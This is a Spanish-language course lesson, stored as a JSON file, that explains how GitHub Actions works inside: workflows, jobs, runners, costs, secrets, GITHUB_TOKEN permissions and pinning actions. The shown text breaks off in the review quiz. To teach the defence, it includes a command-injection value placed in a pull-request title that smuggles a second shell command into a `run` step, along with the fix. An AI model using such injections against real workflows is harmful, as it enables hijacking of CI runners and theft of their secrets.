@@ -1,0 +1,619 @@
+{
+ "id": "14-15",
+ "titulo": "CI/CD II: GitHub Actions por dentro",
+ "bajada": "Abrís un workflow de GitHub Actions y sabés qué máquina lo corre, quién puede leer sus secretos y qué línea lo puede romper o dejar abierto.",
+ "minutos": 28,
+ "vigencia": "herramienta",
+ "revisado": "2026-11-16",
+ "objetivos": [
+  "Nombrar las piezas de GitHub Actions (evento, workflow, job, paso, acción, runner) y decir cuál contiene a cuál.",
+  "Leer un workflow completo línea por línea y predecir en qué orden corren sus jobs y cuánto tarda el conjunto.",
+  "Explicar qué es un runner alojado, qué recursos tiene y cuánto cuesta un minuto cuando se acaba lo gratis.",
+  "Distinguir un secreto de Actions del GITHUB_TOKEN y reducir los permisos de este último al mínimo.",
+  "Reconocer una inyección de comandos en un `run` y corregirla pasando el valor por una variable de entorno."
+ ],
+ "venis_de": "En [@04-20] y [@04-21] viste la idea de la integración y la entrega continuas, y ayer, en [@14-14], las partes de un pipeline: etapas, caché, matriz de pruebas y artefactos versionados. Hoy abrimos una herramienta concreta, GitHub Actions, que es la que usa Senda, y miramos cómo está hecha por dentro.",
+ "se_apoya_en": [
+  "04-20",
+  "04-21",
+  "14-14",
+  "14-13"
+ ],
+ "gancho": [
+  "Juan aprieta un botón verde que dice «Run workflow» en la pestaña Actions del repositorio de Senda. Cuarenta minutos después aparece en la página de versiones un archivo `senda-prueba-NN.apk` que se puede instalar en un teléfono. Entre el clic y el archivo, alguien instaló Node, bajó cientos de megas de dependencias, compiló código Java y C++, firmó un paquete y lo subió. Nadie de la familia hizo nada de eso en su compu.",
+  "Ese alguien es una máquina virtual de Microsoft que se creó para esa corrida y se borró al terminar. Hoy vas a ver cómo se le dice qué hacer (un archivo de texto en el repositorio), cómo se la despierta, cuánto cuesta, y sobre todo qué tiene a mano mientras corre: copias de tus claves. Un archivo de cincuenta líneas manda sobre una máquina que guarda secretos. Conviene saber leerlo."
+ ],
+ "bloques": [
+  {
+   "t": "h",
+   "x": "Las piezas y cuál contiene a cuál"
+  },
+  {
+   "t": "p",
+   "x": [
+    "GitHub Actions es el sistema de automatización que viene dentro de GitHub. Se configura con archivos de texto en el formato YAML que viven en la carpeta `.github/workflows/` del repositorio. Cada archivo es un **[[workflow de Actions|workflow de Actions]]**: una receta completa que dice cuándo arrancar y qué hacer. Un repositorio puede tener tantos como quiera. Senda tiene diez.",
+    "Lo que dispara un workflow es un **evento**: alguien hizo `push`, alguien abrió un pull request, alguien apretó el botón manual, llegó la hora de un reloj programado. Si el evento no está en la lista `on:` del archivo, el workflow ni se entera de que pasó. Cuando el evento llega, el workflow se ejecuta una vez y esa ejecución se llama *run* («corrida»).",
+    "Adentro del workflow hay uno o más **[[jobs|job]]**. Un job es un grupo de pasos que corre entero sobre una misma máquina. Dos jobs distintos corren en máquinas distintas, y por eso no comparten archivos: lo que uno produce y el otro necesita tiene que viajar como artefacto, igual que viste en [@14-14]. Adentro de cada job hay **pasos** (*steps*) que corren en orden, uno detrás del otro, y si uno falla el job se corta ahí (salvo que le digas lo contrario)."
+   ]
+  },
+  {
+   "t": "p",
+   "x": [
+    "Cada paso hace una de dos cosas. O ejecuta un comando de shell (`run:`), como `npm test`, o invoca una **acción** (`uses:`): un paquete reutilizable, escrito por GitHub o por otra persona, que se baja y se ejecuta. `actions/checkout` es la más usada: copia el código del repositorio dentro de la máquina, porque una máquina recién creada está vacía."
+   ]
+  },
+  {
+   "t": "diagrama",
+   "tipo": "arbol",
+   "raiz": {
+    "t": "Evento",
+    "s": "push, pull_request, botón manual, reloj...",
+    "k": "cliente",
+    "h": [
+     {
+      "t": "Workflow",
+      "s": "un archivo .yml en .github/workflows",
+      "k": "red",
+      "h": [
+       {
+        "t": "Job «pruebas»",
+        "s": "una máquina propia",
+        "k": "servidor",
+        "h": [
+         {
+          "t": "Paso: acción checkout",
+          "s": "uses:",
+          "k": "datos"
+         },
+         {
+          "t": "Paso: npm test",
+          "s": "run:",
+          "k": "datos"
+         }
+        ]
+       },
+       {
+        "t": "Job «publicar»",
+        "s": "otra máquina, espera a «pruebas»",
+        "k": "servidor",
+        "h": [
+         {
+          "t": "Paso: gh release create",
+          "s": "run:",
+          "k": "datos"
+         }
+        ]
+       }
+      ]
+     }
+    ]
+   },
+   "cap": "Evento, workflow, job y paso. Los jobs corren en máquinas distintas; los pasos de un mismo job comparten máquina y carpeta de trabajo."
+  },
+  {
+   "t": "nota",
+   "k": "analogia",
+   "titulo": "Una corrida como un despacho de camiones",
+   "x": "Pensalo como un depósito. El evento es el pedido que entra. El workflow es el procedimiento escrito: «si entra un pedido de tal tipo, hacé esto». Cada job es un equipo con su propia carretilla y su propio sector, y los pasos son las tareas de ese equipo en orden. Dos equipos no comparten la carretilla: si uno arma un pallet que necesita el otro, lo deja en la playa de carga (el artefacto). Donde la analogía deja de valer: el equipo de un job se disuelve al terminar, y la siguiente corrida arranca con un sector vacío, sin memoria de la anterior."
+  },
+  {
+   "t": "h",
+   "x": "Un workflow real, línea por línea"
+  },
+  {
+   "t": "p",
+   "x": [
+    "Este es un workflow de práctica que escribí para este día. No es el de Senda: es más corto, y lo que enseña es la estructura. Es una receta inventada para un proyecto de Node que corre pruebas en cada pull request y, si estamos en la rama principal, publica una versión."
+   ]
+  },
+  {
+   "t": "codigo",
+   "lang": "yaml",
+   "x": "name: CI\non:\n  pull_request:\n  workflow_dispatch:\n    inputs:\n      nota:\n        description: \"Texto libre\"\n        default: \"\"\npermissions:\n  contents: read\nconcurrency:\n  group: ci-${{ github.ref }}\n  cancel-in-progress: true\njobs:\n  pruebas:\n    runs-on: ubuntu-latest\n    timeout-minutes: 15\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22\n          cache: npm\n      - run: npm ci\n      - run: npm test\n  publicar:\n    needs: pruebas\n    if: github.ref == 'refs/heads/main'\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    env:\n      NOTA: ${{ inputs.nota }}\n    steps:\n      - uses: actions/checkout@v4\n      - name: Crear la versión\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: gh release create \"v${{ github.run_number }}\" --notes \"$NOTA\"",
+   "cap": ".github/workflows/ci.yml, de práctica. Pasó el análisis de actionlint v1.7.12 sin ningún aviso."
+  },
+  {
+   "t": "lista",
+   "ord": false,
+   "items": [
+    "`on:` lista los eventos. `pull_request` corre cada vez que se abre o se actualiza uno. `workflow_dispatch` es el botón manual y permite definir campos que se llenan al apretarlo (aquí, `nota`).",
+    "`permissions: contents: read` achica lo que puede hacer la credencial automática de la corrida. Más abajo vemos por qué importa.",
+    "`concurrency` agrupa corridas por rama y cancela la anterior si llega una nueva del mismo grupo: no tiene sentido terminar de probar un commit que ya fue reemplazado.",
+    "`runs-on: ubuntu-latest` elige el tipo de máquina. `timeout-minutes: 15` corta el job si se cuelga; sin ese número, el límite por defecto es de 360 minutos, seis horas de máquina facturable por un bucle infinito.",
+    "`needs: pruebas` hace que «publicar» espere a que «pruebas» termine bien. Sin `needs`, los jobs corren a la vez.",
+    "`if: github.ref == 'refs/heads/main'` salta el job si la corrida no es de la rama principal. El job «publicar» tiene además sus propios `permissions`, que reemplazan a los del workflow."
+   ]
+  },
+  {
+   "t": "pensa",
+   "x": "En el workflow de arriba, ¿qué pasa con el job «publicar» cuando alguien abre un pull request desde otra rama? ¿Y qué pasa si en ese caso falla una prueba de «pruebas»?",
+   "resp": "En un pull request el evento es `pull_request`, la rama no es `main` y la condición `if` da falso: «publicar» se salta, no se crea ninguna versión. Si falla una prueba, «pruebas» termina en rojo y «publicar» tampoco correría aunque la condición diera verdadero, porque `needs` exige que el job anterior haya salido bien."
+  },
+  {
+   "t": "h",
+   "x": "Eventos: qué enciende cada workflow"
+  },
+  {
+   "t": "p",
+   "x": [
+    "Los eventos más comunes caben en una tabla. El catálogo completo es largo (hay eventos de issues, de versiones, de otros workflows) y está en la documentación oficial [#senda24-gha-events]. Lo importante es la pregunta de diseño: **¿quién quiero que pueda encender esto, y qué puede tocar cuando lo enciende?**"
+   ]
+  },
+  {
+   "t": "tabla",
+   "cab": [
+    "Evento",
+    "Cuándo corre",
+    "Para qué se usa"
+   ],
+   "filas": [
+    [
+     "`push`",
+     "Alguien sube commits a una rama",
+     "Desplegar al integrar a la rama principal; se puede filtrar por rama y por carpetas (`paths`)"
+    ],
+    [
+     "`pull_request`",
+     "Se abre, actualiza o reabre un pull request",
+     "Probar antes de aceptar un cambio"
+    ],
+    [
+     "`workflow_dispatch`",
+     "Alguien aprieta el botón o llama a la API",
+     "Tareas a pedido, con campos de entrada"
+    ],
+    [
+     "`schedule`",
+     "Un reloj en formato cron",
+     "Tareas periódicas, como limpiezas"
+    ],
+    [
+     "`workflow_call`",
+     "Otro workflow lo invoca",
+     "Reutilizar una receta (ver más abajo)"
+    ]
+   ],
+   "cap": "Eventos habituales. Fuente: documentación de GitHub, «Events that trigger workflows», leída el 16-11-2026."
+  },
+  {
+   "t": "senda",
+   "titulo": "Senda se enciende casi siempre con un botón",
+   "x": [
+    "De los diez workflows de Senda, ocho se disparan solo con `workflow_dispatch`: el botón. `limpieza.yml` suma un reloj (`schedule`), y el de la base de datos (`supabase.yml`) suma un `push` a `main`, filtrado a las carpetas `supabase/migrations/` y `supabase/functions/`, así que arranca solo cuando cambia algo de la base. Ninguno escucha `pull_request`. Hecho verificado en el código: por ahora no hay un robot que pruebe cada cambio antes de integrarlo; el control corre cuando alguien aprieta «Run workflow» para armar un APK.",
+    "No es un error: para un equipo de una persona, un botón a pedido gasta menos minutos que probar cada commit. Es una decisión con un costo: si un cambio rompe algo, nadie se entera hasta la próxima compilación. Esto corresponde al commit `25e08fa`; el código cambia, la forma permanece."
+   ],
+   "archivos": [
+    ".github/workflows/apk.yml",
+    ".github/workflows/supabase.yml",
+    ".github/workflows/humo.yml"
+   ]
+  },
+  {
+   "t": "h",
+   "x": "Jobs en paralelo, en cadena y en máquinas alquiladas"
+  },
+  {
+   "t": "p",
+   "x": [
+    "Los jobs forman un grafo: los que no tienen `needs` arrancan juntos y los demás esperan. El tiempo total que ves en el reloj es el del camino más largo, mientras que lo que se factura es la suma de las máquinas encendidas. Eso se calcula con unas pocas líneas. Probalo con un workflow inventado, con minutos redondos, que tiene cinco jobs encadenados."
+   ]
+  },
+  {
+   "t": "codigo",
+   "lang": "js",
+   "ejecutable": true,
+   "x": "// Workflow inventado: nombre -> {needs, minutos}. Cada job corre en su propio runner.\nconst jobs = {\n  lint:    { needs: [],                 min: 1 },\n  pruebas: { needs: [],                 min: 4 },\n  build:   { needs: ['lint', 'pruebas'], min: 6 },\n  e2e:     { needs: ['build'],           min: 5 },\n  deploy:  { needs: ['build', 'e2e'],    min: 2 },\n};\nconst fin = {};\nfunction termina(n) {\n  if (fin[n] !== undefined) return fin[n];\n  const j = jobs[n];\n  const empieza = Math.max(0, ...j.needs.map(termina));\n  console.log(`${n.padEnd(8)} empieza en min ${empieza}, termina en min ${empieza + j.min}`);\n  return (fin[n] = empieza + j.min);\n}\nconst total = Math.max(...Object.keys(jobs).map(termina));\nconst facturado = Object.values(jobs).reduce((a, j) => a + j.min, 0);\nconsole.log(`\\nReloj de pared: ${total} min`);\nconsole.log(`Minutos de runner facturables: ${facturado} min`);\nconsole.log(`Costo de una corrida a 0,006 USD/min: ${(facturado * 0.006).toFixed(3)} USD`);\nconsole.log(`Corridas por mes con 12 USD incluidos: ${Math.floor(12 / (facturado * 0.006))}`);",
+   "cap": "Un planificador de jobs de juguete. Corrido en node 22 en esta VM. Los minutos son inventados; el precio es el de una máquina Linux de 2 núcleos (ver más abajo)."
+  },
+  {
+   "t": "p",
+   "x": [
+    "Mirá la diferencia: 17 minutos de espera, 18 de facturación. Si «lint» y «pruebas» hubieran sido secuenciales, el reloj mostraría 18 y la factura sería la misma. Paralelizar **acorta la espera sin abaratar nada**. Y viceversa: lo que abarata es acortar cada job o evitar corridas inútiles, justo lo que hacen la caché y el `concurrency` del workflow de arriba. El cálculo ignora los redondeos de facturación, que la documentación explica."
+   ]
+  },
+  {
+   "t": "p",
+   "x": [
+    "La máquina que corre cada job es un **[[runner alojado|runner alojado]]** (*GitHub-hosted runner*): una máquina virtual que GitHub crea para el job, con el sistema operativo que pediste en `runs-on`, ya cargada con herramientas habituales (Node, Python, Java, Docker, Git). Cuando el job termina, la máquina se destruye. Eso tiene una consecuencia de seguridad buena (lo que un job deja en disco no sobrevive para el siguiente) y una incómoda: **todo hay que reinstalarlo en cada corrida**. Por eso existe la caché que viste en [@14-14]: `setup-node` con `cache: npm` guarda `~/.npm` entre corridas y evita bajar todo de cero.",
+    "La alternativa es un *self-hosted runner*: una máquina tuya con el agente de GitHub instalado. Tenés el control del hardware, y también toda la responsabilidad de mantenerla y de que no la use código ajeno. Para un proyecto como Senda, que no tiene servidores propios, no tiene sentido."
+   ]
+  },
+  {
+   "t": "tabla",
+   "cab": [
+    "Tipo de repositorio",
+    "Etiqueta",
+    "Núcleos",
+    "RAM",
+    "Disco",
+    "Costo"
+   ],
+   "filas": [
+    [
+     "Público",
+     "`ubuntu-latest`",
+     "4",
+     "16 GB",
+     "14 GB",
+     "Gratis e ilimitado"
+    ],
+    [
+     "Privado",
+     "`ubuntu-latest`",
+     "2",
+     "8 GB",
+     "14 GB",
+     "0,006 USD por minuto de job, contra lo incluido en el plan"
+    ],
+    [
+     "Privado",
+     "`ubuntu-slim`",
+     "1",
+     "5 GB",
+     "14 GB",
+     "0,002 USD por minuto"
+    ]
+   ],
+   "cap": "Máquinas Linux x64 alojadas por GitHub. Fuentes: «GitHub-hosted runners reference» y «GitHub Actions billing» (documentación de GitHub), leídas el 16-11-2026."
+  },
+  {
+   "t": "nota",
+   "k": "vigencia",
+   "titulo": "Planes, precios y máquinas al 16-11-2026",
+   "x": [
+    "Según la documentación de facturación de GitHub, el plan Free incluye por mes un monto de cómputo de 12 USD, Pro y Team 18 USD, y Enterprise Cloud 300 USD; se expresa en dinero y no en minutos, y a la tarifa de 0,006 USD por minuto de Linux de 2 núcleos, 12 USD equivalen a 2.000 minutos (es una cuenta mía, no una cifra de la página). El plan Free incluye además 500 MB de artefactos y 10 GB de caché por repositorio [#ci-gha-billing]. Los repositorios públicos usan los runners estándar sin costo.",
+    "Las specs de la tabla (2 núcleos en privados, 4 en públicos) salen de la página de runners de GitHub [#ci-gha-hosted-runners-ref]. La etiqueta `ubuntu-latest` no es un número de versión: GitHub la mueve de una versión de Ubuntu a otra con el tiempo, y esa página lista también etiquetas fijas como `ubuntu-24.04`. Si necesitás reproducibilidad, usá la fija. Estos números cambian: antes de decidir con ellos, mirá la fuente."
+   ]
+  },
+  {
+   "t": "pensa",
+   "x": "Un job de 10 minutos en un repositorio privado de plan Free, a 0,006 USD por minuto: ¿cuántas corridas de ese job entran en los 12 USD mensuales incluidos?",
+   "resp": "Cada corrida cuesta 10 × 0,006 = 0,06 USD, y 12 / 0,06 = 200 corridas por mes, a razón de unas 6 o 7 por día. Es un margen cómodo para apretar un botón de vez en cuando y escaso si cada commit dispara varios jobs largos."
+  },
+  {
+   "t": "h",
+   "x": "Pasos y acciones: código ajeno que se ejecuta con tus claves"
+  },
+  {
+   "t": "p",
+   "x": [
+    "Una línea como `uses: actions/setup-node@v4` dice: «bajá del repositorio `actions/setup-node` lo que esté marcado con la etiqueta `v4` y ejecutalo en este paso». Esa acción corre con los mismos permisos y el mismo entorno que el resto del job, o sea que ve las variables de entorno y puede leer los archivos de la carpeta de trabajo. Hay una cadena de confianza escondida en cada `uses:`.",
+    "El problema es que una etiqueta como `v4` es **móvil**: quien mantiene la acción puede mover la etiqueta a otro commit. Es una comodidad (recibís arreglos solo) y un riesgo (si alguien compromete esa cuenta, tu próxima corrida ejecuta código nuevo). La guía oficial de uso seguro recomienda fijar una acción a un commit completo (el SHA de 40 caracteres), que no se puede mover sin cambiar su contenido [#ci-gha-secure-use]. Se ve feo, `actions/checkout@<40 caracteres>`, y por eso la práctica común es dejar un comentario con la versión y que una herramienta como Dependabot la actualice.",
+    "Distinguí la regla de la costumbre: para acciones de la propia GitHub (`actions/*`) mucha gente acepta la etiqueta, y para acciones de terceros pocos se animan. Es una decisión de riesgo, y para mí una regla práctica es fijar por SHA todo lo que toca secretos."
+   ]
+  },
+  {
+   "t": "senda",
+   "titulo": "Las acciones de Senda: todas por etiqueta",
+   "x": [
+    "En los diez workflows hay 27 usos de acciones: 11 de `actions/checkout@v4`, 4 de `setup-java@v4`, 3 de `setup-node@v4`, 3 de `setup-python@v5`, 3 de `upload-artifact@v4` y 3 de `gradle/actions/setup-gradle@v4`. Todas fijadas por etiqueta móvil y ninguna por SHA. Todas son de GitHub, salvo la de Gradle, que es del proyecto Gradle. La conclusión que importa para decidir: el riesgo es real pero chico, y el arreglo es mecánico; no es el primero de la lista."
+   ],
+   "archivos": [
+    ".github/workflows/apk.yml",
+    ".github/workflows/aab.yml",
+    ".github/workflows/supabase.yml"
+   ]
+  },
+  {
+   "t": "h",
+   "x": "Secretos y GITHUB_TOKEN: dos credenciales distintas"
+  },
+  {
+   "t": "p",
+   "x": [
+    "Un **[[secreto de Actions|secreto de Actions]]** es un valor (una clave de API, un token, una contraseña) que guardás cifrado en la configuración del repositorio y que un workflow puede leer con `${{ secrets.NOMBRE }}`. La interfaz de GitHub no te deja volver a verlo después de guardarlo, y los registros de la corrida lo reemplazan por asteriscos si aparece. Pero el enmascarado funciona buscando el texto exacto: si un script imprime el secreto cambiado (en base64, partido en dos), no se reconoce.",
+    "Dos reglas de la documentación [#github-docs-using-secrets] explican casi todo el modelo de seguridad. **Primera:** con la excepción del `GITHUB_TOKEN`, los secretos no se pasan a los workflows disparados desde un fork. Si no fuera así, cualquiera podría abrir un pull request que imprimiera tus claves. **Segunda:** cualquier persona con permiso de escritura en el repositorio puede leer todos los secretos, porque puede escribir un workflow que los use [#ci-gha-secure-use]. Un secreto de Actions protege de gente que no tiene escritura, no de colaboradores.",
+    "El **[[GITHUB_TOKEN|GITHUB_TOKEN]]** es otra cosa. Es una credencial que GitHub fabrica sola al empezar cada corrida y que vence al terminar. Sirve para hablar con la API de GitHub (crear una versión, comentar un pull request) y no hay que guardarla en ningún lado. Se accede con `github.token` o `secrets.GITHUB_TOKEN`. Lo importante es qué le permitís hacer, y eso se define con `permissions`."
+   ]
+  },
+  {
+   "t": "tabla",
+   "cab": [
+    "",
+    "Secreto de Actions",
+    "GITHUB_TOKEN"
+   ],
+   "filas": [
+    [
+     "Quién lo crea",
+     "Vos, a mano, en la configuración",
+     "GitHub, automáticamente en cada corrida"
+    ],
+    [
+     "Cuánto vive",
+     "Hasta que lo cambies o lo borres",
+     "Lo que dura la corrida"
+    ],
+    [
+     "Para qué",
+     "Hablar con servicios de afuera (Supabase, una API)",
+     "Hablar con GitHub (versiones, issues, commits)"
+    ],
+    [
+     "Cómo se achica",
+     "Con una credencial que ya sea de poco poder",
+     "Con `permissions:` en el workflow o en el job"
+    ],
+    [
+     "En un pull request desde un fork",
+     "No se entrega",
+     "Se entrega, con permisos de solo lectura"
+    ]
+   ],
+   "cap": "Las dos credenciales de una corrida. Fuente: documentación de GitHub, «Using secrets in GitHub Actions» y «Workflow syntax», leídas el 16-11-2026. La fila del fork sale de «Events that trigger workflows»."
+  },
+  {
+   "t": "p",
+   "x": [
+    "La regla del **mínimo privilegio** dice que cada pieza reciba solo lo que necesita. En un workflow se aplica así: ponés `permissions: contents: read` arriba de todo, y cada job que necesite más lo pide por su cuenta, como hace «publicar» en el workflow de ejemplo. La documentación aclara un detalle fácil de olvidar: apenas nombrás un permiso, **todos los que no nombraste pasan a `none`** [#ci-gha-workflow-syntax]. Un workflow con `contents: write` y nada más no puede, por ejemplo, comentar en un issue."
+   ]
+  },
+  {
+   "t": "senda",
+   "titulo": "Qué secretos y permisos tiene la fábrica de Senda",
+   "x": [
+    "En `apk.yml` los secretos que lee el job son `SUPABASE_ACCESS_TOKEN`, `SUPABASE_PROJECT_ID` y `POSTHOG_KEY`, y están declarados en el paso que los necesita con `env:`, no en todo el job. Eso reparte bien la exposición: los demás pasos no los ven. Los identificadores de los anuncios (`ADMOB_*`) son variables (`vars.`) y no secretos, porque no son confidenciales. Los permisos del workflow son `contents: write`, necesarios para crear la versión de prueba con `gh release create`; con `GH_TOKEN: ${{ github.token }}`.",
+    "El punto fino: `contents: write` está a nivel del workflow, así que lo tiene el único job del archivo, incluidos los pasos que corren `npm ci` y las dependencias de terceros. El arreglo clásico es dividir en dos jobs: uno que compila con `contents: read` y otro, corto, que publica con `write`. Es una mejora de higiene, no una falla grave, y hoy se ejecuta solo cuando alguien lo pide."
+   ],
+   "archivos": [
+    ".github/workflows/apk.yml",
+    ".github/workflows/aab.yml",
+    ".github/workflows/firma.yml",
+    ".github/workflows/lotes.yml"
+   ]
+  },
+  {
+   "t": "h",
+   "x": "El agujero clásico: la inyección en un `run`"
+  },
+  {
+   "t": "p",
+   "x": [
+    "Hay un detalle del motor que casi nadie ve hasta que le muerde. Cuando escribís `run: echo \"${{ github.event.pull_request.title }}\"`, GitHub **reemplaza la expresión por su valor antes de que el shell corra**. El shell no recibe una variable: recibe un texto ya armado. Si el título del pull request es `hola\"; echo INYECTADO; echo \"`, el script resultante tiene tres comandos en vez de uno. Es la misma familia de ataque que la inyección de SQL del [@07-07] y de sus vecinas: datos de un extraño que terminan interpretados como código.",
+    "Lo probé en esta VM simulando el reemplazo. Primero con el valor pegado en el script, como hace `${{ }}` dentro de un `run`; después con el valor en una variable de entorno, que es el arreglo que recomienda la guía oficial [#ci-gha-secure-use]."
+   ]
+  },
+  {
+   "t": "terminal",
+   "lineas": [
+    {
+     "c": "T='hola\"; echo INYECTADO; echo \"'\necho 'echo \"Título: '\"$T\"'\"' > v1.sh\ncat v1.sh\nbash v1.sh",
+     "s": "echo \"Título: hola\"; echo INYECTADO; echo \"\"\nTítulo: hola\nINYECTADO\n"
+    },
+    {
+     "c": "echo 'echo \"Título: $TITULO\"' > v2.sh\ncat v2.sh\nTITULO=\"$T\" bash v2.sh",
+     "s": "echo \"Título: $TITULO\"\nTítulo: hola\"; echo INYECTADO; echo \""
+    }
+   ],
+   "cap": "Arriba, el valor se pega en el script y se ejecuta como comando: sale la palabra INYECTADO. Abajo, el valor viaja como variable y se imprime como texto. Prueba local que simula el reemplazo de GitHub; el título es inventado."
+  },
+  {
+   "t": "p",
+   "x": [
+    "Ahora corré el análisis automático. `actionlint` ya lo usaste en [@04-20]: lee los workflows sin ejecutarlos y marca errores. Armé un archivo con cuatro errores a propósito (un título de pull request pegado en un `run`, un `needs` hacia un job que no existe, una etiqueta de máquina mal escrita y una entrada inexistente de una acción) y le pasé la versión v1.7.12, instalada con `go install` desde su repositorio oficial."
+   ]
+  },
+  {
+   "t": "terminal",
+   "lineas": [
+    {
+     "c": "actionlint -oneline mal.yml | cut -c1-150",
+     "s": "mal.yml:12:24: \"github.event.pull_request.title\" is potentially untrusted. avoid using it directly in inline scripts. instead, pass it through an envi\nmal.yml:13:3: job \"dos\" needs job \"tres\" which does not exist in this workflow [job-needs]\nmal.yml:15:14: label \"ubuntu-lates\" is unknown. available labels are \"windows-latest\", \"windows-latest-8-cores\", \"windows-2025\", \"windows-2025-vs2026\"\nmal.yml:20:11: input \"reff\" is not defined in action \"actions/checkout@v4\". available inputs are \"clean\", \"fetch-depth\", \"fetch-tags\", \"filter\", \"gith"
+    },
+    {
+     "c": "actionlint -oneline .github/workflows/ci.yml; echo rc=$?",
+     "s": "rc=0"
+    }
+   ],
+   "cap": "Los cuatro errores sembrados, detectados con su línea y columna, y el workflow de práctica limpio. Las líneas largas están cortadas a 150 caracteres para que entren."
+  },
+  {
+   "t": "nota",
+   "k": "ojo",
+   "titulo": "Un linter no ve todo",
+   "x": "En ese mismo archivo había una quinta línea mala, `echo \"Nota ${{ inputs.nota }}\"`, con un campo de texto libre del botón manual pegado en el script. actionlint no la marcó: su lista de valores sospechosos son los que vienen de eventos como un pull request o un issue, y los campos de `workflow_dispatch` no están en la lista. En ese caso el riesgo es menor, porque solo pueden apretar el botón personas con escritura (que de todos modos leen los secretos). Pero es el mismo mecanismo, y un valor con comillas rompe el script aunque nadie tenga mala intención. Un linter reduce los errores; no reemplaza el criterio."
+  },
+  {
+   "t": "senda",
+   "titulo": "Lo que muestra el código de Senda",
+   "x": [
+    "Corrí `actionlint` v1.7.12 sobre los diez workflows de Senda, sin ejecutar nada y sin escribir en el repositorio. Resultado: un solo aviso, de nivel informativo, en `lotes.yml` línea 60, que viene de `shellcheck` (falta poner comillas dobles en una variable). Sintaxis, etiquetas, entradas de acciones y `needs`: todo en orden.",
+    "Hay un hallazgo más fino que el linter no ve. En `apk.yml` el texto libre `nota` y el número de prueba pasan por `env:` (`NOTA`, `NUMERO`), que es la forma correcta. En `lotes.yml` y `aab.yml`, en cambio, los campos del botón manual (`accion`, `tarea`, `idioma`, `ids`, `rutas` y `nota`) se pegan directo adentro del script con `${{ inputs.* }}`. En `lotes.yml` ese paso tiene además en su entorno la clave de la API de Claude. Quien aprieta el botón ya tiene permiso de escritura, así que no se abre una puerta nueva; el riesgo práctico es el accidente (un valor con comillas o espacios que rompe el comando) más que el ataque. El arreglo es el mismo de arriba: pasar cada campo por `env:`."
+   ],
+   "archivos": [
+    ".github/workflows/lotes.yml",
+    ".github/workflows/aab.yml",
+    ".github/workflows/apk.yml"
+   ]
+  },
+  {
+   "t": "h",
+   "x": "Reutilizar, limitar y no olvidarse de apagar"
+  },
+  {
+   "t": "p",
+   "x": [
+    "Cuando varios workflows repiten los mismos pasos (Senda arma Node, Java y Gradle en tres de ellos), GitHub ofrece dos mecanismos. Una **acción compuesta** empaqueta varios pasos en uno que se invoca con `uses:`. Un **workflow reutilizable** (`on: workflow_call`) empaqueta jobs enteros que otro workflow llama como si fueran un job más; los secretos hay que pasárselos de forma explícita, porque no se heredan solos [#github-docs-using-secrets]. Se paga con indirección: para entender una corrida ahora hay que leer dos archivos.",
+    "Tres hábitos que ahorran sustos. Poner `timeout-minutes` en cada job, para que un cuelgue cueste minutos y no horas. Poner `concurrency` con `cancel-in-progress: true` en los trabajos pesados, como hace Senda con su grupo `apk`. Y mirar el resumen de la corrida: lo que un paso escribe en `$GITHUB_STEP_SUMMARY` aparece formateado en la página de la corrida, y Senda lo usa para listar el peso de cada parte del APK."
+   ]
+  },
+  {
+   "t": "pasos",
+   "titulo": "Cómo leer un workflow ajeno en cinco minutos",
+   "pasos": [
+    {
+     "t": "Mirá `on:`",
+     "x": "Antes de nada, quién lo enciende. Un `pull_request` desde forks y un botón manual son riesgos muy distintos."
+    },
+    {
+     "t": "Mirá `permissions:`",
+     "x": "Qué puede hacer el token. Si no está, el valor por defecto lo define la configuración del repositorio o de la organización."
+    },
+    {
+     "t": "Buscá `secrets.`",
+     "x": "En qué pasos viven y si se pasan por `env:` al paso que los usa y no a todo el job."
+    },
+    {
+     "t": "Buscá `${{` dentro de `run:`",
+     "x": "Cada vez que un valor de entrada entra ahí, preguntate de quién viene."
+    },
+    {
+     "t": "Mirá los `uses:`",
+     "x": "Qué código ajeno se ejecuta, de quién es y si está fijado por etiqueta o por SHA."
+    }
+   ]
+  },
+  {
+   "t": "nota",
+   "k": "mito",
+   "titulo": "«Si el log enmascara el secreto, está seguro»",
+   "x": "El enmascarado de los registros evita que un secreto aparezca en pantalla por accidente. No es una barrera contra alguien que escribe el workflow: un paso malicioso puede mandarlo por la red a otro servidor, y ahí nadie lo enmascara. La barrera real es quién puede editar workflows, qué acciones ajenas se ejecutan y qué poder tiene la credencial guardada."
+  },
+  {
+   "t": "ejercicio",
+   "x": "Tomá este fragmento y reescribilo para que un título de pull request con comillas no pueda romper ni controlar el comando. Después decí qué permiso mínimo necesitaría un job que solo comenta en el pull request.\n\nsteps:\n  - run: echo \"Título ${{ github.event.pull_request.title }}\"",
+   "pista": "El valor va a una variable de entorno del paso, y el script la usa con comillas dobles. Para comentar en un pull request, el token necesita un permiso de escritura sobre un tipo de recurso, y solo uno.",
+   "solucion": "steps:\n  - env:\n      TITULO: ${{ github.event.pull_request.title }}\n    run: echo \"Título $TITULO\"\n\nEl valor ya no forma parte del texto del script: el shell lo lee de la variable como un dato. Para comentar en un pull request, el job pide `permissions: pull-requests: write` (y nada más; lo que no se nombra pasa a `none`, así que si además hace falta leer el código se suma `contents: read`)."
+  }
+ ],
+ "recap": [
+  "Un evento enciende un workflow; el workflow tiene jobs; cada job corre en su propia máquina y tiene pasos que corren en orden y comparten carpeta.",
+  "Un runner alojado es una máquina virtual nueva por job, que se destruye al terminar: lo que no viaja como artefacto o caché se pierde.",
+  "El reloj de una corrida es el del camino más largo de `needs`; la factura es la suma de los minutos de cada job. Paralelizar acorta la espera, no el costo.",
+  "Un secreto de Actions lo ponés vos; el GITHUB_TOKEN lo fabrica GitHub por corrida. Cualquiera con escritura puede leer los secretos del repositorio.",
+  "Mínimo privilegio: `permissions` arriba de todo y más permisos solo en el job que los necesita; lo no nombrado pasa a `none`.",
+  "Un valor externo pegado con `${{ }}` dentro de un `run` se convierte en código; se arregla pasándolo por `env:`.",
+  "Senda tiene diez workflows, casi todos a mano, con acciones por etiqueta y sin pruebas automáticas en pull requests."
+ ],
+ "repaso": [
+  {
+   "p": "Un workflow tiene dos jobs, «A» y «B», sin `needs` entre ellos. «A» crea un archivo `datos.txt` en su carpeta de trabajo. ¿Puede «B» leerlo?",
+   "o": [
+    "No: cada job corre en su propia máquina virtual nueva, y para pasar el archivo hay que subirlo como artefacto y bajarlo en «B»",
+    "Sí: los dos jobs son del mismo workflow, así que comparten la carpeta de trabajo mientras dure la corrida entera",
